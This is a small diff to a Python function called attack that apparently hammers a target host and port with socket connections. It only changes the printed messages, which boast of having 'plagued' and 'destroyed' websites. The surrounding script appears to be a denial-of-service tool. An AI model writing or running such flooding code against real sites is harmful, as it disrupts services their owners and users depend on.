@@ -23,9 +23,7 @@ def attack(target, port, duration):
             s.recv(1024)
             end = time.time()
             ping = round((end - start) * 1000, 2)
-            print(f"Successfully plagued {target}:{port}! 🤢🦠 | Ping: {ping}ms")
-        except socket.timeout:
-            print("websie destroyed")
+            print(f"Successfully plagued {target}:{port}! 🤢🦠 attempting to destroy | Ping: {ping}ms")
         except Exception as e:
             print(f"Error: {e}")
         finally:
